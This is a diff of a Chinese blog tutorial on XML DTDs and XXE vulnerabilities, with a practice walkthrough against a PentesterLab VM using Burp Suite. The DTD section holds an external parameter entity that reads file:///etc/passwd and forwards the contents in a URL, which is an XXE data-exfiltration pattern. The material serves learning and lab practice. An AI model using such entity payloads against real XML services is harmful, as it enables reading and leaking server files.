@@ -37,7 +37,7 @@ XML有关的几点：
 所有XML都必须要">
 <meta property="og:image" content="http://img.blog.csdn.net/20161204205517599">
 <meta property="og:image" content="http://img.blog.csdn.net/20161204205634398">
-<meta property="og:updated_time" content="2017-01-19T03:10:44.000Z">
+<meta property="og:updated_time" content="2017-02-22T08:54:27.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Xxe漏洞及xxe练习">
 <meta name="twitter:description" content="如果有问题请您指正。
@@ -354,7 +354,7 @@ XML有关的几点：
 <blockquote>
 <p>语法如下: &lt;!DOCTYPE 根元素 [元素声明]&gt;</p>
 </blockquote>
-  <figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- This's a DTD example in XML file --&gt;</span></div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE note [</span></div><div class="line">    &lt;!ELEMENT note (to, from, heading, body)&gt;</div><div class="line">    &lt;!ELEMENT to (#PCDATA)&gt;</div><div class="line">    &lt;!ELEMENT from (#PCDATA)&gt;</div><div class="line">    &lt;!ELEMENT heading (#PCDATA)&gt;</div><div class="line">    &lt;!ELEMEhhNT body (#PCDATA)&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span> jxy <span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span> jxy <span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span> Remider <span class="tag">&lt;/<span class="name">heading</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span> Don't forgot working hard <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure>
+  <figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- This's a DTD example in XML file --&gt;</span></div><div class="line">&lt;?xml version="1.0"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE note [</span></div><div class="line">    &lt;!ELEMENT note (to, from, heading, body)&gt;</div><div class="line">    &lt;!ELEMENT to (#PCDATA)&gt;</div><div class="line">    &lt;!ELEMENT from (#PCDATA)&gt;</div><div class="line">    &lt;!ELEMENT heading (#PCDATA)&gt;</div><div class="line">    &lt;!ELEMEhhNT body (#PCDATA)&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span> shinpachi8 <span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span> shinpachi8 <span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span> Remider <span class="tag">&lt;/<span class="name">heading</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span> Don't forgot working hard <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure>
 <ul>
 <li><code>!DOCTYPE note</code> 定义此文档是note类型的文档</li>
 <li><code>!ELEMENT note</code> 定义note元素有四个元素 : to,from,heading, body</li>
@@ -369,21 +369,42 @@ XML有关的几点：
 </li>
 </ul>
 </li>
-<li><p>DTD 解释<br> 所有的XML以为HTML文档均为以下简单的构建模块构成.<br> | 元素 | 属性 | 实体 | PCDATA | CDATA |<br> |——|——|——|——-|——–|<br> | 同上 | 同上 | 同上 | PCDATA是会被解析器解析的文本，这些文本将会被解析器检查实体与标记。| CDATA是不会被解析器解析的文件。|</p>
-<p> 重点在于 DTD中的实体声明。这是XXE洞的基础。其中SYSTEM|PUBLIC是两种状态，一是私有的，另外一个是公有的。可参考 <a href="http://xmlwriter.net/xml_guide/entity_declaration.shtml" target="_blank" rel="external">这篇文章</a></p>
-<ul>
-<li><p>一个内部实体的声明</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名 &quot;实体的值&quot; &gt;</div><div class="line">&lt;!-- Examples --&gt;</div><div class="line">&lt;!ENTITY write &quot;Shinpachi8&quot; &gt;</div><div class="line">&lt;!ENTITY copyright &apos;@Shinpachi8&apos;&gt;</div><div class="line"></div><div class="line">&lt;!-- 参数变量声明 --&gt;</div><div class="line">&lt;!ENTITY %foo1 SYSTEM &quot;foo1&quot;&gt;</div><div class="line">&lt;!-- 在使用时，用%来使用. --&gt;</div><div class="line">%foo1;</div></pre></td></tr></table></figure>
-</li>
-<li><p>一个外部实体的声明。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名 SYSTEM|PUBLIC &quot;url/uri&quot;&gt;</div><div class="line">&lt;!-- Example --&gt;</div><div class="line">&lt;!ENTITY writer SYSTEM &quot;http://xxx.com&quot;&gt;</div><div class="line">&lt;!ENTITY copyrite PUBLIC &apos;../xx.dtd&apos;&gt;</div><div class="line"></div><div class="line">&lt;!-- 参数变量声明 --&gt;</div><div class="line">&lt;!ENTITY %foo1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY %foo2 SYSTEM &quot;http://127.0.0.1/id=%foo1;&quot;&gt;</div></pre></td></tr></table></figure>
-</li>
-<li><p>CDATA 解释<br>这里稍微解释一下CDATA的内容。如上所说CDATA是不应由XML解析器进行解析的文本数据 (Unparsed Character Data)。在CDATA中，即使’&lt;&gt;&amp;’符号也不会产生错误。CDATA部分由<code>&lt;![CDATA[</code>开始，由<code>]]&gt;</code>结束。但是CDATA部分不能包含字符串<code>]]&gt;</code>。如下.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">&lt;![CDATA[</div><div class="line">function matchwo(a, b)&#123;</div><div class="line">    if (a &lt; b &amp;&amp; a &lt; 0) then</div><div class="line">    &#123;</div><div class="line">        return 1;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">]]&gt;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
-</li>
-</ul>
+<li><p>DTD 解释<br> 所有的XML以为HTML文档均为以下简单的构建模块构成.</p>
 </li>
 </ol>
+<table>
+<thead>
+<tr>
+<th>元素</th>
+<th>属性</th>
+<th>实体</th>
+<th>PCDATA</th>
+<th>CDATA</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>同上</td>
+<td>同上</td>
+<td>同上</td>
+<td>PCDATA是会被解析器解析的文本，这些文本将会被解析器检查实体与标记。</td>
+<td>CDATA是不会被解析器解析的文件。</td>
+</tr>
+</tbody>
+</table>
+<p>重点在于 DTD中的实体声明。这是XXE洞的基础。其中SYSTEM|PUBLIC是两种状态，一是私有的，另外一个是公有的。可参考 <a href="http://xmlwriter.net/xml_guide/entity_declaration.shtml" target="_blank" rel="external">这篇文章</a></p>
+<ul>
+<li>一个内部实体的声明</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名 &quot;实体的值&quot; &gt;</div><div class="line">&lt;!-- Examples --&gt;</div><div class="line">&lt;!ENTITY write &quot;Shinpachi8&quot; &gt;</div><div class="line">&lt;!ENTITY copyright &apos;@Shinpachi8&apos;&gt;</div><div class="line"></div><div class="line">&lt;!-- 参数变量声明 --&gt;</div><div class="line">&lt;!ENTITY %foo1 SYSTEM &quot;foo1&quot;&gt;</div><div class="line">&lt;!-- 在使用时，用%来使用. --&gt;</div><div class="line">%foo1;</div></pre></td></tr></table></figure>
+<ul>
+<li>一个外部实体的声明。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY 实体名 SYSTEM|PUBLIC &quot;url/uri&quot;&gt;</div><div class="line">&lt;!-- Example --&gt;</div><div class="line">&lt;!ENTITY writer SYSTEM &quot;http://xxx.com&quot;&gt;</div><div class="line">&lt;!ENTITY copyrite PUBLIC &apos;../xx.dtd&apos;&gt;</div><div class="line"></div><div class="line">&lt;!-- 参数变量声明 --&gt;</div><div class="line">&lt;!ENTITY %foo1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY %foo2 SYSTEM &quot;http://127.0.0.1/id=%foo1;&quot;&gt;</div></pre></td></tr></table></figure>
+<ul>
+<li>CDATA 解释<br>这里稍微解释一下CDATA的内容。如上所说CDATA是不应由XML解析器进行解析的文本数据 (Unparsed Character Data)。在CDATA中，即使’&lt;&gt;&amp;’符号也不会产生错误。CDATA部分由<code>&lt;![CDATA[</code>开始，由<code>]]&gt;</code>结束。但是CDATA部分不能包含字符串<code>]]&gt;</code>。如下.</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">&lt;![CDATA[</div><div class="line">function matchwo(a, b)&#123;</div><div class="line">    if (a &lt; b &amp;&amp; a &lt; 0) then</div><div class="line">    &#123;</div><div class="line">        return 1;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">]]&gt;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
 <h1 id="XXE-漏洞"><a href="#XXE-漏洞" class="headerlink" title="XXE 漏洞"></a>XXE 漏洞</h1><p>OWASP关于XXE的一些文档:</p>
 <ol>
 <li><a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008" target="_blank" rel="external">Testing for XML Injection</a>)</li>
@@ -395,7 +416,7 @@ XML有关的几点：
 <li>在<a href="https://pentesterlab.com/exercises/play_xxe" target="_blank" rel="external">pentest lab</a> 上下载iso镜象并安装至VIRTUAL BOX上。打开网页是一个登录界面。</li>
 <li>用BURPSUITE做代理得如下。<br> <img src="http://img.blog.csdn.net/20161204205517599" alt="play xxe login"></li>
 <li><p>用xml的实体来试。<br> 输入为：</p>
- <figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /login HTTP/1.1</div><div class="line">Host: 10.108.40.26</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://10.108.40.26/login</div><div class="line">Connection: keep-alive</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Length: 37</div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>xxe</div></pre></td></tr></table></figure>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /login HTTP/1.1</div><div class="line">Host: 10.108.40.26</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://10.108.40.26/login</div><div class="line">Connection: keep-alive</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Length: 37</div><div class="line"></div><div class="line">&lt;?xml version="1.0"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>xxe</div></pre></td></tr></table></figure>
 <p> 虽然 请求内容为非正常的XML, 但是回复与上图相同。 原因在于<code>Content-Type</code>请求头未设置。即如果请求为：</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /login HTTP/1.1</div><div class="line">Host: 10.108.40.26</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://10.108.40.26/login</div><div class="line">Connection: keep-alive</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: text/xml</div><div class="line">Content-Length: 31</div><div class="line"></div><div class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</div><div class="line">&lt;foo&gt;xxe</div></pre></td></tr></table></figure>
 <p> 那么响应为：</p>
@@ -431,7 +452,7 @@ XML有关的几点：
         <p><span>本文标题:</span><a href="/2017/01/18/xxe漏洞及xxe练习/">Xxe漏洞及xxe练习</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Shinpachi8</a></p>
         <p><span>发布时间:</span>2017-01-18, 20:42:51</p>
-        <p><span>最后更新:</span>2017-01-19, 11:10:44</p>
+        <p><span>最后更新:</span>2017-02-22, 16:54:27</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2017/01/18/xxe漏洞及xxe练习/" title="Xxe漏洞及xxe练习">http://yoursite.com/2017/01/18/xxe漏洞及xxe练习/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/01/18/xxe漏洞及xxe练习/　　作者: Shinpachi8" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
